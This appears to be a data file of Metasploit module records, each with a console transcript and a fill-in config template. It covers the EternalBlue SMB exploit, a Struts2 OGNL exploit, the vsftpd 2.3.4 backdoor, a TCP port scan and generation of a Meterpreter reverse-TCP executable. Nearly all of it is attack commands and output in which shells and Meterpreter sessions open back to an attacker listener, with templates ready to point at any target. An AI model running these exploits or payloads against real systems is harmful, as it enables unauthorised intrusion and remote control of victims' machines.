name: exploit/windows/smb/ms17_010_eternalblue
description: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
transcript:
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] 192.168.1.10:445 - Connecting to target for exploitation...
[+] 192.168.1.10:445 - The target is vulnerable.
[*] Meterpreter session 1 opened
config:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <your_ip>
run

name: exploit/multi/http/struts2_content_type_ognl
transcript:
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(struts2_content_type_ognl) > set RHOSTS 10.10.10.10
msf6 exploit(struts2_content_type_ognl) > run
[*] Started reverse TCP handler...
[*] 10.10.10.10:8080 - Exploiting...
[*] Command shell session 1 opened
config:
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS <target>
set LHOST <your_ip>
run

name: exploit/unix/ftp/vsftpd_234_backdoor
transcript:
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.1.5
msf6 exploit(vsftpd_234_backdoor) > run
[*] 192.168.1.5:21 - Banner: 220 (vsFTPd 2.3.4)
[+] Backdoor service detected
[*] Command shell session 1 opened

name: auxiliary/scanner/portscan/tcp
transcript:
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(portscan/tcp) > run
[*] Scanning 256 hosts...
[+] 192.168.1.1:80 - open
[+] 192.168.1.1:22 - open
[*] Scanned 256 of 256 hosts (100% complete)

name: payload/windows/meterpreter/reverse_tcp
transcript:
msf6 > use payload/windows/meterpreter/reverse_tcp
msf6 payload(reverse_tcp) > set LHOST 10.0.0.1
msf6 payload(reverse_tcp) > generate
[*] Creating executable for payload...
[+] Payload saved as shell.exe
config:
use payload/windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
generate
